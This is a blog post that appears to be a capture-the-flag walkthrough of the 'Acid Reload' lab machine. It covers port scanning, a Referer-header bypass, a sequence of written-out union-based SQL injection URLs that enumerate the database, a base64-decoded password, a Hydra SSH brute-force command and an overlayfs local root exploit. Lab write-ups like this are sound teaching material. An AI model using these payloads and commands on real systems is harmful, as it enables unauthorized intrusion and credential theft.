---
layout: post
title: "acid_reload"
date: 2016-09-11 08:58:02 -0500
comments: true
categories: 
---

##Tools:

* netdiscover
* Nmap
* Wfuzz
* DirBuster
* Burp


###Vulnerabilities:


<!--more-->
Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.41.0/24`

{% img  /images/blog/vulhub/acid_reload/Selection_001.png   [title manually exploit [alt text]] %}

192.168.41.170is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.41.171 -p-`

{% img  /images/blog/vulhub/acid_reload/Selection_002.png   [title manually exploit [alt text]] %}

port 22 and 33447 are opening.

Port 33447 is filter, I run nmap again

`nmap -sV -v -O -A -T5 192.168.41.171 -p 33447`

{% img  /images/blog/vulhub/acid_reload/Selection_003.png   [title manually exploit [alt text]] %}

now I know it is running http service.

use nikto to scan:

`nikto -h 192.168.41.171:33447`

{% img  /images/blog/vulhub/acid_reload/Selection_004.png   [title manually exploit [alt text]] %}

find a hidden path '/bin'

check the page `192.168.41.171:33447/bin`

{% img  /images/blog/vulhub/acid_reload/Selection_005.png   [title manually exploit [alt text]] %}

use DirBuster to scan

{% img  /images/blog/vulhub/acid_reload/Selection_006.png   [title manually exploit [alt text]] %}

use Burpsuit to check when I try to get `/bin/dashboard.php`

{% img  /images/blog/vulhub/acid_reload/Selection_007.png   [title manually exploit [alt text]] %}

it is redirected to `/bin/includes/validation.php`. I can use referer bypass

change http request to `GET /bin/dashboard.php HTTP/1.1` and referer to `Referer: http://192.168.41.171:33447/bin/includes/validation.php`

{% img  /images/blog/vulhub/acid_reload/Selection_008.png   [title manually exploit [alt text]] %}

forward the traffic

{% img  /images/blog/vulhub/acid_reload/Selection_009.png   [title manually exploit [alt text]] %}

Bypass successfully.

check the source code

{% img  /images/blog/vulhub/acid_reload/Selection_010.png   [title manually exploit [alt text]] %}

got an link `l33t_haxor.php`

check the page code
{% img  /images/blog/vulhub/acid_reload/Selection_011.png   [title manually exploit [alt text]] %}

find `l33t_haxor.php?id=` looks like sqli

Let's verify

insert

`http://192.168.41.171:33447/bin/l33t_haxor.php?id=1'`

{% img  /images/blog/vulhub/acid_reload/Selection_012.png   [title manually exploit [alt text]] %}

easy sqli

`http://192.168.41.171:33447/bin/l33t_haxor.php?id=1' and true--+` no output, so, it is bracket enclosed single quote.

now lets check how many columns we need by inserting null

```
http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null)from(information_schema.columns)WHERE'1'='1
http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),(null)from(information_schema.columns)WHERE'1'='1
http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),(null),(null)from(information_schema.columns)WHERE'1'='1
```

when there are two 'null', no error come back, so the column number is 2.

next check which column holds string value.

`http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select('test'),(null)from(information_schema.columns)WHERE'1'='1`

no response

`http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),('test')from(information_schema.columns)WHERE'1'='1`


{% img  /images/blog/vulhub/acid_reload/Selection_013.png   [title manually exploit [alt text]] %}

now we know column holds string value

now get the version

`http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(NULL),(@@VERSION)from(information_schema.columns)WHERE'1'='1`


{% img  /images/blog/vulhub/acid_reload/Selection_014.png   [title manually exploit [alt text]] %}

get user,

`http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(NULL),(user())from(information_schema.columns)WHERE'1'='1`

{% img  /images/blog/vulhub/acid_reload/Selection_015.png   [title manually exploit [alt text]] %}

get table name

`http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),GROUP_CONCAT(DISTINCT(table_schema))from(information_schema.tables)WHERE'a'='a`

{% img  /images/blog/vulhub/acid_reload/Selection_016.png   [title manually exploit [alt text]] %}

got four databases information_schema,mysql,performance_schema,secure_login


get table name

`http://192.168.41.171:33447/bin/l33t_haxor.php?id=-1')union(select(null),GROUP_CONCAT(DISTINCT(table_name))from(information_schema.columns)WHERE(table_schema)=database()and'test'like'test`

{% img  /images/blog/vulhub/acid_reload/Selection_017.png   [title manually exploit [alt text]] %}


`wget http://192.168.41.171:33447/UB3R/strcpy.exe`

check the file

`file strcpy.exe`

`strcpy.exe: PDF document, version 1.5`. a pdf file in it.


use foremost to recover

`foremost strcpy.exe`

in folder `output`,get a folder called rar and there is a rar file, unzip it , get a file called `lol.jpg`

try to use foremost on this file, get another rar, unzip it get a file called `Avinash.contact`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<c:contact c:Version="1" xmlns:c="http://schemas.microsoft.com/Contact" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:MSP2P="http://schemas.microsoft.com/Contact/Extended/MSP2P" xmlns:MSWABMAPI="http://schemas.microsoft.com/Contact/Extended/MSWABMAPI">
	<c:CreationDate>2015-08-23T11:39:18Z</c:CreationDate><c:Extended><MSWABMAPI:PropTag0x3A58101F c:ContentType="binary/x-ms-wab-mapi" c:type="binary">AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=</MSWABMAPI:PropTag0x3A58101F></c:Extended>
	<c:ContactIDCollection><c:ContactID c:ElementID="599ef753-f77f-4224-8700-e551bdc2bb1e"><c:Value>0bcf610e-a7be-4f26-9042-d6b3c22c9863</c:Value></c:ContactID></c:ContactIDCollection><c:EmailAddressCollection><c:EmailAddress c:ElementID="0745ffd4-ef0a-4c4f-b1b6-0ea38c65254e"><c:Type>SMTP</c:Type><c:Address>acid.exploit@gmail.com</c:Address><c:LabelCollection><c:Label>Preferred</c:Label></c:LabelCollection></c:EmailAddress><c:EmailAddress c:ElementID="594eec25-47bd-4290-bd96-a17448f7596a" xsi:nil="true"/></c:EmailAddressCollection><c:NameCollection><c:Name c:ElementID="318f9ce5-7a08-4ea0-8b6a-2ce3e9829ff2"><c:FormattedName>Avinash</c:FormattedName><c:GivenName>Avinash</c:GivenName></c:Name></c:NameCollection><c:PersonCollection><c:Person c:ElementID="865f9eda-796e-451a-92b1-bf8ee2172134"><c:FormattedName>Makke</c:FormattedName><c:LabelCollection><c:Label>wab:Spouse</c:Label></c:LabelCollection></c:Person></c:PersonCollection><c:PhotoCollection><c:Photo c:ElementID="2fb5b981-cec1-45d0-ae61-7c340cfb3d72"><c:LabelCollection><c:Label>UserTile</c:Label></c:LabelCollection></c:Photo></c:PhotoCollection></c:contact>
```

find a base64 encoded `AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=`, its NooB@123

create a dict file

```
Avinash
avinash
Makke
makke
acid
acid.exploit
acid.exploit@gmail.com
NooB@123
```


use hydra to crack

`hydra -L dict.txt -P dict.txt  192.168.41.171 ssh -s 22`

get login: makke   password: NooB@123

find `.bash_history` file

{% img  /images/blog/vulhub/acid_reload/Selection_018.png   [title manually exploit [alt text]] %}

find an interesting file `overlayfs`

`locate overlayfs`

in `/bin`

`ls -alh overlayfs`

`-rwxr-xr-x 1 root root 12K Aug 24  2015 overlayfs`

which is overlayfs local root exploit file

run it 
get the root


{% img  /images/blog/vulhub/acid_reload/Selection_019.png   [title manually exploit [alt text]] %}